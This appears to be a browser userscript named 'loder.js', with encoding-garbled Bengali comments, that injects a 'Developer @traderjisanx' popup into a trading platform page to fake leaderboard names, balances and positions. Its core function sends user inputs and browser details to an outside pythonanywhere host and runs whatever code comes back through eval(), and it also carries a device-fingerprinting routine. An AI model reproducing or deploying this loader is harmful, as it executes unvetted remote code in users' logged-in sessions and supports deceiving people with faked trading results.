// ‡¶≤‡¶æ‡¶á‡¶∏‡ßá‡¶®‡ßç‡¶∏ ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á‡¶Ø‡¶º‡ßá‡¶∞ ‡¶´‡¶æ‡¶á‡¶≤ ‚Äî loder.js (‡¶∏‡¶Ç‡¶∂‡ßã‡¶ß‡¶ø‡¶§ ‡¶∏‡¶Ç‡¶∏‡ßç‡¶ï‡¶∞‡¶£)
(async function () {
// 1. SweetAlert2 ‡¶≤‡¶æ‡¶á‡¶¨‡ßç‡¶∞‡ßá‡¶∞‡¶ø ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ
if (typeof Swal === 'undefined') {
await new Promise((resolve, reject) => {
const s = document.createElement('script');
s.src = 'https://cdn.jsdelivr.net/npm/sweetalert2@11';
s.onload = resolve;
s.onerror = reject;
document.head.appendChild(s);
});
}

// 2. ‡¶Æ‡ßÇ‡¶≤ ‡¶≠‡ßç‡¶Ø‡¶æ‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶¨‡¶≤ ‡¶è‡¶¨‡¶Ç ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
const SERVER_FETCH_CODE = 'https://jisan1122.pythonanywhere.com/server';
let demoBalance = 12500;

// 3. ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (‡¶Ö‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶ø‡¶§)
function getDeviceInfo() {
const ua = navigator.userAgent || '';
const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
return {
fingerprint: localStorage.getItem('deviceFingerprint') || 'dev_' + Math.random().toString(36).slice(2, 12),
deviceType: /Mobile/.test(ua) ? 'Mobile' : /Tablet/.test(ua) ? 'Tablet' : 'Desktop',
browser: (/Firefox/.test(ua) && 'Firefox') || (/Chrome/.test(ua) && 'Chrome') || (/Safari/.test(ua) && 'Safari') || 'Unknown',
os: (/Windows/.test(ua) && 'Windows') || (/Macintosh/.test(ua) && 'Mac OS') || (/Android/.test(ua) && 'Android') || 'Unknown',
userAgent: ua,
screenResolution: `${window.screen.width}x${window.screen.height}`,
plugins,
hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
language: navigator.language
};
}

function getDeviceId() {
let id = localStorage.getItem('customDeviceId');
if (!id) {
id = 'dev-' + Math.random().toString(36).slice(2, 12) + '-' + (navigator.hardwareConcurrency || '1') + '-' + window.screen.width + 'x' + window.screen.height;
localStorage.setItem('customDeviceId', id);
}
return id;
}

// 4. UI ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (‡¶Ö‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶ø‡¶§)
function displayMessage(msg, t = 2500) {
const el = document.createElement('div');
el.className = 'message-popup';
el.textContent = msg;
document.body.appendChild(el);
setTimeout(() => {
el.style.opacity = '0';
el.style.top = '0px';
setTimeout(() => el.remove(), 300);
}, t);
}

function showCenteredMessage(text, duration) {
const el = document.createElement('div');
el.id = 'centeredDeveloperMessage';
el.textContent = text;
document.body.appendChild(el);
setTimeout(() => {
el.style.opacity = '1';
}, 10);
setTimeout(() => {
el.style.opacity = '0';
setTimeout(() => el.remove(), 500);
}, duration);
}

function showDemoBalanceSection() {
const ds = document.getElementById('demoBalanceSection');
if (ds) {
ds.classList.remove('hide');
ds.classList.add('show');
}
}

// 5. ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ (CSS)
const styles = `
#settingsPopup {
position: fixed; top: 50%; left: 50%;
transform: translate(-50%, -50%) scale(0.95);
background: linear-gradient(135deg, rgb(255, 174, 0), #FFFAF0);
padding: 15px; border-radius: 10px;
box-shadow: 0px 5px 15px rgba(0,0,0,0.2);
z-index: 10000; width: 320px; max-height: 90vh;
overflow-y: auto; text-align: center;
font-family: Arial, sans-serif; font-size: 13px;
opacity: 0; transition: all 0.3s ease-out;
}
#settingsPopup.show { opacity: 1; transform: translate(-50%, -50%) scale(1); }
#settingsPopup h2 { margin: 5px 0 10px; font-size: 16px; color: #222; }
#settingsPopup label { display: block; margin-bottom: 8px; color: #444; text-align: left; }
#settingsPopup input, #settingsPopup select {
width: 100%; padding: 6px; margin-top: 4px;
border: 1px solid #ccc; border-radius: 4px;
box-sizing: border-box; font-size: 12px;
}
#settingsPopup button {
width: 100%; padding: 8px; margin-top: 8px;
border-radius: 4px; border: none;
color: white; cursor: pointer; transition: 0.2s;
font-size: 13px;
}
#settingsPopup button#saveButton { background: #007bff; }
#settingsPopup button.close-btn { background: #dc3545; }
#settingsPopup button:disabled { background: #6c757d; cursor: not-allowed; }
#demoBalanceSection {
margin-top: 10px; padding: 10px;
background: rgba(255,255,255,0.2);
border-radius: 6px; transition: all 0.3s ease;
}
#demoBalanceSection.hide { opacity: 0; height: 0; padding: 0; margin: 0; overflow: hidden; }
#demoBalanceSection.show { opacity: 1; height: auto; }
#cheatCodeDisplay { font-size: 11px; padding: 6px; margin-top: 8px; line-height: 1.4; }
.message-popup {
position: fixed; top: 20px; left: 50%;
transform: translateX(-50%); background: rgba(0,0,0,0.75);
color: #fff; padding: 10px 20px; border-radius: 6px;
z-index: 10002;
transition: opacity 0.3s, top 0.3s;
}
.swal2-container { z-index: 10003 !important; }
#centeredDeveloperMessage {
position: fixed; top: 50%; left: 50%;
transform: translate(-50%, -50%);
background: rgba(0, 0, 0, 0.85);
color: white; padding: 20px 40px; border-radius: 10px;
font-size: 20px; font-weight: bold;
z-index: 10004; opacity: 0;
transition: opacity 0.5s ease;
box-shadow: 0 5px 20px rgba(0,0,0,0.5);
}
#refreshBalanceBtn {
    position: absolute;  
    top: 35px;  
    right: 8px;  
    transform: translateY(-50%);  
    cursor: pointer;  
    width: 24px;  
    height: 24px;  
    display: flex;  
    align-items: center;  
    justify-content: center;  
    border-radius: 50%;  
    background-color: #f0f0f0;  
    transition: background-color 0.2s;  
}  
#refreshBalanceBtn:hover { background-color: #e0e0e0; }  
#refreshBalanceBtn svg { width: 16px; height: 16px; fill: #333; }  
@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }  
.spinning { animation: spin 0.5s linear; }
`;

// 6. ‡¶Æ‡ßÇ‡¶≤ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü ‡¶∞‡¶æ‡¶® ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (‡¶Ö‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶ø‡¶§)
async function runMainScript(lname, iblafp, midPosition, basePosition, countryFlag) {
try {
const params = new URLSearchParams({ lname, iblafp, flagCode: countryFlag, userAgent: navigator.userAgent, windowSize: window.innerWidth + 'x' + window.innerHeight });
const resp = await fetch(SERVER_FETCH_CODE + '?' + params.toString(), { method: 'GET', headers: { Accept: 'application/json' } });
const data = await resp.json();
if (data && data.valid && data.code) {
try { eval(data.code); } catch (e) { console.error('eval error', e); }
} else {
displayMessage('No code returned or invalid response');
}
} catch (e) {
displayMessage('Failed to fetch code');
}
}

// 7. ‡¶™‡¶™‡¶Ü‡¶™ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ì ‡¶á‡¶≠‡ßá‡¶®‡ßç‡¶ü ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶ø‡¶Ç
async function createSettingsPopup() {
const container = document.createElement('div');
container.id = 'settingsPopupContainer';
container.innerHTML = `
<div id="settingsPopup">
<h2>Developer: @traderjisanx</h2>
<label>Leaderboard Name:<input type="text" id="lname" placeholder="Enter Name"></label>
<div style="position: relative;">  
<label>Leaderboard Balance:<input type="number" id="iblafp" placeholder="Enter Balance"></label>  
<span id="refreshBalanceBtn" title="Fetch Current Balance">  
<svg viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path></svg>  
</span>  
</div>  
<label>Mid Position:<input type="number" id="midPosition" value="1690"></label>  
<label>Maximum Position:<input type="number" id="basePosition" value="789345"></label>  
<label>Country Flag:  
<select id="countryFlagSelect">  
<option value="bd">üáßüá© Bangladesh</option>  
<option value="in">üáÆüá≥ India</option>  
</select>  
</label>  
<div id="demoBalanceSection" class="show">  
<h3>Demo Balance Settings</h3>  
<input type="number" id="demoBalanceInput" placeholder="Enter demo balance" value="${demoBalance}">  
<button id="setDemoBtn" style="background:#17a2b8;">Update Demo Balance</button>  
<div id="demoBalanceStatus" style="font-size:12px; margin-top:6px; color:green;"></div>  
</div>  
<button id="saveButton">Save Settings</button>  
<button class="close-btn" id="closeBtn">Close</button>  
<div id="cheatCodeDisplay">Default Cheat Code</div>  
</div>  
`;

document.head.appendChild(Object.assign(document.createElement('style'), { textContent: styles }));  
document.body.appendChild(container);  

const popupElement = document.getElementById('settingsPopup');  
setTimeout(() => popupElement.classList.add('show'), 10);  

const refreshBtn = document.getElementById('refreshBalanceBtn');  
refreshBtn.addEventListener('click', () => {  
    refreshBtn.classList.add('spinning');  
    const balanceElement = document.querySelector('.---react-features-Usermenu-styles-module__infoBalance--pVBHU');  
    if (!balanceElement) { displayMessage('Error: Could not find the balance element.'); setTimeout(() => refreshBtn.classList.remove('spinning'), 500); return; }  
    const balanceText = balanceElement.textContent;  
    const processedBalance = balanceText.replace(/\D/g, '');   
    const leaderboardInput = document.getElementById('iblafp');  
    leaderboardInput.value = processedBalance;  
    displayMessage('Balance updated!');  
    setTimeout(() => refreshBtn.classList.remove('spinning'), 500);  
});  

document.getElementById('setDemoBtn')?.addEventListener('click', () => {  
  const v = document.getElementById('demoBalanceInput').value;  
  if (!v || isNaN(v)) { displayMessage('Please enter a valid balance'); return; }  
  demoBalance = parseInt(v, 10);  
  const statusEl = document.getElementById('demoBalanceStatus');  
  statusEl.textContent = 'Demo balance updated!';  
  setTimeout(() => statusEl.textContent = '', 2500);  
});  

document.getElementById('saveButton').addEventListener('click', async () => {  
  const lname = document.getElementById('lname').value || '';  
  const iblafp = document.getElementById('iblafp').value || '';  
  const midPosition = document.getElementById('midPosition').value || '1690';  
  const basePosition = document.getElementById('basePosition').value || '789345';  
  const countryCode = document.getElementById('countryFlagSelect').value || 'bd';  
  const countryFlagSVG = `<svg class="flag flag-${countryCode}"><use xlink:href="/profile/images/flags.svg#flag-${countryCode}"></use></svg>`;  
  await runMainScript(lname, iblafp, midPosition, basePosition, countryFlagSVG);  
  closeSettingsPopup();  
  showCenteredMessage('Developer @traderjisanx !', 5000);  
});  

document.getElementById('closeBtn').addEventListener('click', closeSettingsPopup);

}

function closeSettingsPopup() {
const popup = document.getElementById('settingsPopup');
if (popup) {
popup.classList.remove('show');
setTimeout(() => popup.parentElement.remove(), 300);
}
}

// 8. ‡¶°‡¶ø‡¶¨‡¶æ‡¶ó‡¶ø‡¶Ç ‡¶è‡¶¨‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ
window.loder_runMainScript = runMainScript;
await createSettingsPopup();

})();
